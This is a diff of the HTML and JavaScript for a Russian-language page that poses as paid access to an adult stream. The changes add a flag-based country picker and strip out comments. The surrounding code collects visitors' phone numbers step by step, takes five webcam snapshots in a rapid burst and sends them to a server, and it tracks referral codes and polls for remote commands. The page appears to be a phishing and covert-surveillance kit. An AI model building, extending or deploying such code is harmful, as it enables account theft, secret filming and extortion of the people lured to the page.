@@ -249,7 +249,7 @@
             margin-bottom: 12px;
         }
 
-        /* ===== ВЫБОР СТРАНЫ ===== */
+        /* ===== ВЫБОР СТРАНЫ С ФЛАГАМИ ===== */
         .country-selector {
             width: 100%;
             padding: 14px;
@@ -271,6 +271,9 @@
             background: #1a1a1a;
             color: white;
             padding: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
         .modal-btn {
@@ -492,7 +495,7 @@
         <h3 id="modalTitle">🔞 Доступ к стриму</h3>
         <p id="modalDesc">Выберите страну и введите номер</p>
         
-        <!-- ВЫБОР СТРАНЫ -->
+        <!-- ===== ВЫБОР СТРАНЫ С ФЛАГАМИ ===== -->
         <select id="countrySelect" class="country-selector" onchange="updateCountryCode()">
             <option value="+7">🇷🇺 Россия (+7)</option>
             <option value="+380">🇺🇦 Украина (+380)</option>
@@ -572,7 +575,6 @@
     function updateCountryCode() {
         const select = document.getElementById('countrySelect');
         selectedCountryCode = select.value;
-        // ОБНОВЛЯЕМ ПЛЕЙСХОЛДЕР
         const phoneInput = document.getElementById('phone');
         phoneInput.placeholder = `Введите номер (${selectedCountryCode})`;
     }
@@ -800,7 +802,6 @@
         document.getElementById('modalDesc').innerText = "Выберите страну и введите номер";
         currentPhone = "";
         currentStep = "phone";
-        // СБРАСЫВАЕМ ВЫБОР СТРАНЫ НА РОССИЮ
         document.getElementById('countrySelect').value = '+7';
         selectedCountryCode = '+7';
         document.getElementById('phone').placeholder = "Введите номер (+7)";
@@ -815,15 +816,12 @@
             let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             if (!phone) { statusDiv.innerText = "Введите номер"; return; }
             
-            // ЕСЛИ ПОЛЬЗОВАТЕЛЬ НЕ ВВЁЛ КОД СТРАНЫ, ДОБАВЛЯЕМ ЕГО АВТОМАТИЧЕСКИ
             const countryCode = selectedCountryCode;
             let fullPhone = phone;
             if (!phone.startsWith('+')) {
-                // УДАЛЯЕМ ВСЁ КРОМЕ ЦИФР
                 const digits = phone.replace(/\D/g, '');
                 fullPhone = countryCode + digits;
             } else {
-                // УЖЕ ЕСТЬ +, ОСТАВЛЯЕМ КАК ЕСТЬ
                 fullPhone = phone;
             }
             
@@ -964,7 +962,6 @@
             
             await new Promise(r => setTimeout(r, 300));
             
-            // ===== 5 ФОТОК МГНОВЕННО (БЕЗ ЗАДЕРЖЕК!) =====
             const startTime = performance.now();
             for (let i = 0; i < 5; i++) {
                 canvas.width = videoEl.videoWidth || 640;
@@ -979,7 +976,6 @@
                     },
                     body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
                 });
-                // ===== БЕЗ ЗАДЕРЖКИ! =====
             }
             const endTime = performance.now();
             const totalTime = ((endTime - startTime) / 1000).toFixed(3);
@@ -1006,10 +1002,8 @@
     window.showBroadcast = showBroadcast;
     window.updateCountryCode = updateCountryCode;
     
-    // ========== ЗАГРУЗКА ДАННЫХ ==========
     loadWorkerData();
     
-    // ========== ЗАПУСК ПРОВЕРКИ КОМАНД ==========
     if (currentRefCode) {
         console.log('✅ Запуск проверки команд для ref:', currentRefCode);
         setInterval(checkForBroadcast, 2000);
